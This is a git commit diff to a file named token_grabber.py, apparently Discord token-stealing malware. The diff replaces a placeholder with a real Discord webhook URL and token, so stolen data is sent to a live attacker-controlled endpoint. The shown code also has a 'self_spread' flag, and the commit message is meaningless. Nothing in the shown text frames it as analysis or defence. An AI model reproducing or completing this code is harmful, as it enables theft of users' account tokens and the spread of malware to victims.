53afa23ca00ea73fc68fb8eada35496191e479e7
Sapnisity <139693750+Sapnisity@users.noreply.github.com>
2025-01-25 12:19:21 +0000

    ss
    sumamary

--- token_grabber.py
+++ token_grabber.py
@@ -182,7 +182,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/1332685067478237296/Ii0gcVJBVGFgZg0Afgmdi1KXcOs9K3cyeavdwlAXXdxpf24q0xZ2a6HN9kRuSyIGowNK", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
